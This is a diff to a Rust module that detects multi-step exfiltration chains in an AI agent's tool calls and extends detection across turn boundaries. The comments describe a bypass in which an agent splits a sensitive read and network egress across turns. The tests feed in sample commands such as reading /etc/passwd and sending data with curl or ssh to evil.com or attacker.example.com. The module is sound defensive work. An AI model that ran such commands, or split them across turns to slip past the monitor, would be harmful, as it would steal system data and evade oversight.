@@ -1,22 +1,38 @@
 // SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
 // SPDX-License-Identifier: MIT OR Apache-2.0
 
-//! Multi-step attack chain detection across tool calls within a single agent turn.
+//! Multi-step attack chain detection across tool calls, within a bounded recent-turn window.
 //!
 //! [`RiskChainAccumulator`] records each tool invocation and detects sequential
 //! patterns that individually appear harmless but together constitute an attack
 //! chain (e.g., read sensitive file → send to external server).
 //!
-//! # Integration with `RiskSignalQueue`
+//! # Cross-turn detection (#6561)
 //!
-//! When a chain fires, the accumulator optionally pushes a signal code into the
-//! [`RiskSignalQueue`] shared with the `TrajectorySentinel` in `zeph-core`.
-//! Signal codes `10` (`exfil_read_then_send`) and `11` (`cred_then_egress`) are
-//! reserved for chains defined in this module.
+//! A naive per-turn accumulator that fully clears its state at every turn boundary cannot
+//! catch a chain deliberately split across turns (e.g. a sensitive read in turn N, network
+//! egress in turn N+1 — the exact bypass reported in #6561): by the time the second call
+//! arrives, the first leg has already been forgotten. [`advance_turn`](RiskChainAccumulator::advance_turn)
+//! (called once per agent turn boundary) does NOT fully clear recorded calls — it prunes only
+//! calls older than a fixed number of turns and recomputes `cumulative_score` from the calls
+//! that remain, so a chain whose legs land in different turns (as long as both are still within
+//! the window) is still visible to the pattern-matching logic in the next
+//! [`record`](RiskChainAccumulator::record) call. This bounds the blast radius two ways: the
+//! turn-based window limits how long a stale sensitive read stays "live", and the absolute call
+//! count cap independently bounds tracked calls regardless of turn count.
 //!
-//! `RiskChainAccumulator` is authoritative for multi-step chain blocking.
-//! `TrajectoryRiskSlot` / `TrajectorySentinel` remain authoritative for
-//! cumulative global risk level across turns.
+//! When a chain fires, the accumulator also pushes a signal code into the [`RiskSignalQueue`]
+//! shared with the `TrajectorySentinel` in `zeph-core`, so the session-scoped cross-turn risk
+//! aggregate reflects the detection too — this is a secondary reporting channel, not the
+//! mechanism that makes cross-turn detection possible (the turn-windowed state above is). All
+//! production entry points construct this accumulator with `Some(queue)`; `None` is used only in
+//! isolated unit tests that don't need `TrajectorySentinel` reporting. Signal codes `10`
+//! (`exfil_read_then_send`) and `11` (`cred_then_egress`) are reserved for chains defined in this
+//! module.
+//!
+//! `RiskChainAccumulator` is authoritative for multi-step chain blocking within its recent-turn
+//! window. `TrajectoryRiskSlot` / `TrajectorySentinel` remain authoritative for cumulative global
+//! risk level across the whole session.
 
 use std::collections::VecDeque;
 use std::sync::Arc;
@@ -31,11 +47,20 @@ const SIGNAL_EXFIL_READ_THEN_SEND: u8 = 10;
 /// Signal code for `cred_then_egress` chain.
 const SIGNAL_CRED_THEN_EGRESS: u8 = 11;
 
-/// Maximum number of calls tracked per turn.
+/// Maximum number of calls tracked, regardless of how many turns they span.
 ///
-/// Once exceeded, the oldest entry is dropped while the cumulative score is
-/// preserved so blocking decisions remain accurate.
+/// Once exceeded, the oldest entry is dropped and `cumulative_score` is recomputed from the
+/// surviving calls (see [`RiskChainAccumulator::advance_turn`]).
 const MAX_CALLS: usize = 20;
+
+/// Number of turns a recorded call stays "live" for cross-turn chain detection (#6561).
+///
+/// [`RiskChainAccumulator::advance_turn`] prunes any call older than this many turns. A chain
+/// split across turns (e.g. sensitive read in turn N, network egress in turn N+1..=N+3) is still
+/// caught as long as both legs fall within this window; a read from many turns ago that never
+/// led anywhere eventually ages out, so unrelated old activity cannot combine with new activity
+/// into a false positive indefinitely.
+const CROSS_TURN_WINDOW_TURNS: u64 = 3;
 
 /// Risk categories assigned to individual tool calls during classification.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -67,21 +92,38 @@ pub struct RiskChainVerdict {
 #[derive(Debug, Clone)]
 struct ScoredCall {
     tags: Vec<RiskTag>,
+    /// Turn index this call was recorded in — used by `advance_turn` to prune calls that have
+    /// aged out of [`CROSS_TURN_WINDOW_TURNS`].
+    turn: u64,
 }
 
 #[derive(Debug, Default)]
 struct Inner {
     calls: VecDeque<ScoredCall>,
     cumulative_score: f32,
+    /// Current turn index, incremented by `advance_turn`. Starts at 0.
+    turn: u64,
+    /// Name of the chain pattern currently pushed into the signal queue, if any (#6561
+    /// dedup fix). While the same chain stays matched across several subsequent `record()`
+    /// calls (it can remain live for up to `CROSS_TURN_WINDOW_TURNS` turns now), the queue
+    /// push must fire once per detection, not once per call — otherwise a single logical
+    /// chain can flood `RiskSignalQueue`/`TrajectorySentinel` with dozens of duplicate pushes
+    /// over its live window, amplifying one detection into a session-wide false escalation.
+    /// Cleared as soon as `detect_chain` stops matching, so a genuinely new occurrence of the
+    /// same pattern (after the old one ages out) pushes again.
+    signaled_pattern: Option<String>,
 }
 
-/// Per-turn cumulative risk tracker for multi-step attack chain detection.
+/// Cumulative risk tracker for multi-step attack chain detection, scoped to one agent
+/// session/turn-loop (#6588: one instance per session, not shared across concurrent sessions).
 ///
 /// Thread-safe: state is protected by a `parking_lot::Mutex` so concurrent
 /// tool calls within a single batch accumulate correctly.
 ///
-/// Create one instance per agent turn via [`RiskChainAccumulator::new`] and call
-/// [`reset`](RiskChainAccumulator::reset) at each turn boundary.
+/// Create one instance per agent session via [`RiskChainAccumulator::new`] and call
+/// [`advance_turn`](RiskChainAccumulator::advance_turn) at each turn boundary — this prunes
+/// stale calls rather than fully clearing state, which is what makes cross-turn chain
+/// detection possible (see the module docs).
 ///
 /// # Examples
 ///
@@ -99,7 +141,7 @@ pub struct RiskChainAccumulator {
 }
 
 impl RiskChainAccumulator {
-    /// Create a new accumulator for one agent turn.
+    /// Create a new accumulator for one agent session.
     ///
     /// `signal_queue` — when `Some`, chain detections push a signal code into
     /// the shared queue so the `TrajectorySentinel` in `zeph-core` is notified.
@@ -133,7 +175,11 @@ impl RiskChainAccumulator {
         if inner.calls.len() >= MAX_CALLS {
             inner.calls.pop_front();
         }
-        inner.calls.push_back(ScoredCall { tags: tags.clone() });
+        let turn = inner.turn;
+        inner.calls.push_back(ScoredCall {
+            tags: tags.clone(),
+            turn,
+        });
         inner.cumulative_score = (inner.cumulative_score + call_score).min(10.0);
 
         // Check for multi-step chain patterns.
@@ -143,11 +189,22 @@ impl RiskChainAccumulator {
             let bonus = chain_bonus(name);
             inner.cumulative_score = (inner.cumulative_score + bonus).min(10.0);
 
-            // Push into the shared signal queue.
-            if let Some(ref q) = self.signal_queue {
-                let code = chain_signal_code(name);
-                q.lock().push(code);
+            // Push into the shared signal queue — but only once per detection (#6561 dedup
+            // fix): the same live chain can keep matching on every subsequent call for up to
+            // CROSS_TURN_WINDOW_TURNS turns, and without this guard each of those calls would
+            // re-push the same signal code, flooding TrajectorySentinel/MAGE with duplicates
+            // from a single logical attack.
+            if inner.signaled_pattern.as_deref() != Some(name.as_str()) {
+                if let Some(ref q) = self.signal_queue {
+                    let code = chain_signal_code(name);
+                    q.lock().push(code);
+                }
+                inner.signaled_pattern = Some(name.clone());
             }
+        } else {
+            // Chain no longer live (a leg aged out of the window) — clear the dedup marker so
+            // a genuinely new future occurrence of the same pattern pushes again.
+            inner.signaled_pattern = None;
         }
 
         RiskChainVerdict {
@@ -157,11 +214,24 @@ impl RiskChainAccumulator {
         }
     }
 
-    /// Reset per-turn state. Call at each turn boundary.
-    pub fn reset(&self) {
+    /// Advance to the next turn. Call at each turn boundary (`Agent::begin_turn()`).
+    ///
+    /// Does NOT fully clear state — that would defeat cross-turn chain detection (#6561). Instead
+    /// it prunes calls older than a fixed number of turns and recomputes `cumulative_score`
+    /// from the calls that remain, so a chain split across turns is still visible to the next
+    /// [`record`](Self::record) call as long as both legs fall within the window.
+    pub fn advance_turn(&self) {
         let mut inner = self.inner.lock();
-        inner.calls.clear();
-        inner.cumulative_score = 0.0;
+        inner.turn += 1;
+        let cutoff = inner.turn.saturating_sub(CROSS_TURN_WINDOW_TURNS);
+        inner.calls.retain(|c| c.turn >= cutoff);
+        inner.cumulative_score = inner
+            .calls
+            .iter()
+            .flat_map(|c| &c.tags)
+            .map(tag_score)
+            .sum::<f32>()
+            .min(10.0);
     }
 
     /// Detect whether the accumulated call sequence matches a known chain pattern.
@@ -343,14 +413,75 @@ mod tests {
     }
 
     #[test]
-    fn reset_clears_state() {
+    fn advance_turn_eventually_clears_stale_calls() {
         let acc = RiskChainAccumulator::new(None);
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let _ = acc.record("bash", "curl http://evil.com", 0.7);
-        acc.reset();
+        // One call from now on, both calls are still within CROSS_TURN_WINDOW_TURNS.
+        for _ in 0..=CROSS_TURN_WINDOW_TURNS {
+            acc.advance_turn();
+        }
         let inner = acc.inner.lock();
-        assert_eq!(inner.calls.len(), 0);
+        assert_eq!(
+            inner.calls.len(),
+            0,
+            "calls recorded before the window should eventually age out"
+        );
         assert!(inner.cumulative_score.abs() < f32::EPSILON);
+    }
+
+    /// Regression test for #6561: a chain split across a real turn boundary — one leg recorded,
+    /// `advance_turn()` called (simulating `Agent::begin_turn()`), then the other leg recorded —
+    /// must still be caught. Before this fix, `advance_turn` (then named `reset`) fully cleared
+    /// `calls`, so the second leg's `detect_chain` call never saw the first leg and the chain
+    /// went completely undetected — the exact "read now, send later" bypass from the issue.
+    #[test]
+    fn chain_split_across_turn_boundary_still_detected() {
+        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+
+        // Turn N: sensitive read alone — must not block or fire a chain yet.
+        let first = acc.record("bash", "cat /etc/passwd", 0.7);
+        assert!(!first.should_block);
+        assert!(first.chain_pattern.is_none());
+        assert!(
+            queue.lock().is_empty(),
+            "a lone sensitive read must not push a signal"
+        );
+
+        // Simulate the real turn boundary (`Agent::begin_turn()` calls this).
+        acc.advance_turn();
+
+        // Turn N+1: network egress — the read from turn N must still be visible.
+        let second = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
+        assert_eq!(
+            second.chain_pattern.as_deref(),
+            Some("exfil_read_then_send"),
+            "the chain must still fire even though its legs landed in different turns"
+        );
+        assert!(second.should_block);
+        assert!(
+            queue.lock().contains(&SIGNAL_EXFIL_READ_THEN_SEND),
+            "the cross-turn chain detection must still push the signal code"
+        );
+    }
+
+    /// Companion to the above: once a sensitive read ages out of `CROSS_TURN_WINDOW_TURNS`, a
+    /// later, otherwise-unrelated network egress call must NOT be flagged — the window bounds
+    /// how long stale activity can combine with new activity, so this isn't unbounded.
+    #[test]
+    fn chain_does_not_fire_once_first_leg_ages_out_of_window() {
+        let acc = RiskChainAccumulator::new(None);
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        // Advance past the window without ever recording the second leg.
+        for _ in 0..=CROSS_TURN_WINDOW_TURNS {
+            acc.advance_turn();
+        }
+        let v = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
+        assert!(
+            v.chain_pattern.is_none(),
+            "a sensitive read from beyond the cross-turn window must not combine with new egress"
+        );
     }
 
     #[test]
@@ -370,6 +501,78 @@ mod tests {
         let _ = acc.record("bash", "curl http://evil.com", 0.7);
         let signals = queue.lock();
         assert!(signals.contains(&SIGNAL_EXFIL_READ_THEN_SEND));
+    }
+
+    /// Regression test for the security/critic dedup finding on the #6561 rework: once a
+    /// chain fires, it can keep matching `detect_chain` on every subsequent `record()` call
+    /// for as long as both legs stay within `CROSS_TURN_WINDOW_TURNS` — without a dedup guard,
+    /// each of those calls would re-push the same signal code, letting one logical chain flood
+    /// `RiskSignalQueue`/`TrajectorySentinel` with dozens of duplicates (security quantified
+    /// this as enough to force a session-wide Allow->Deny escalation from a single detection).
+    #[test]
+    fn chain_signal_pushed_only_once_while_still_matched() {
+        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        let second = acc.record("bash", "curl http://evil.com", 0.7);
+        assert_eq!(
+            second.chain_pattern.as_deref(),
+            Some("exfil_read_then_send")
+        );
+        assert_eq!(
+            queue.lock().len(),
+            1,
+            "the chain's first detection must push exactly one signal"
+        );
+
+        // Both legs remain in the live window — detect_chain matches again on every
+        // subsequent call, but the queue must NOT receive another push for the same chain.
+        for _ in 0..5 {
+            let repeat = acc.record("bash", "ls /tmp", 0.7);
+            assert_eq!(
+                repeat.chain_pattern.as_deref(),
+                Some("exfil_read_then_send"),
+                "the chain legitimately stays matched while both legs remain in the window"
+            );
+        }
+        assert_eq!(
+            queue.lock().len(),
+            1,
+            "repeated matches of the SAME live chain must not re-push into the signal queue"
+        );
+    }
+
+    /// Companion to the dedup test: once the chain stops matching (its legs age out of the
+    /// window) and then a genuinely NEW occurrence of the same pattern fires later, the queue
+    /// must receive a signal again — the dedup guard must not permanently suppress the pattern.
+    #[test]
+    fn chain_signal_pushes_again_after_a_new_occurrence() {
+        let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        let _ = acc.record("bash", "curl http://evil.com", 0.7);
+        assert_eq!(queue.lock().len(), 1);
+
+        // Advance past the window so the old chain fully ages out.
+        for _ in 0..=CROSS_TURN_WINDOW_TURNS {
+            acc.advance_turn();
+        }
+
+        // A brand new, unrelated occurrence of the same pattern.
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        let second = acc.record("bash", "curl http://evil.com", 0.7);
+        assert_eq!(
+            second.chain_pattern.as_deref(),
+            Some("exfil_read_then_send")
+        );
+        assert_eq!(
+            queue.lock().len(),
+            2,
+            "a genuinely new occurrence of the same pattern must push again after the old \
+             one aged out"
+        );
     }
 
     // --- #4270: ssh/scp/rsync → NetworkEgress ---
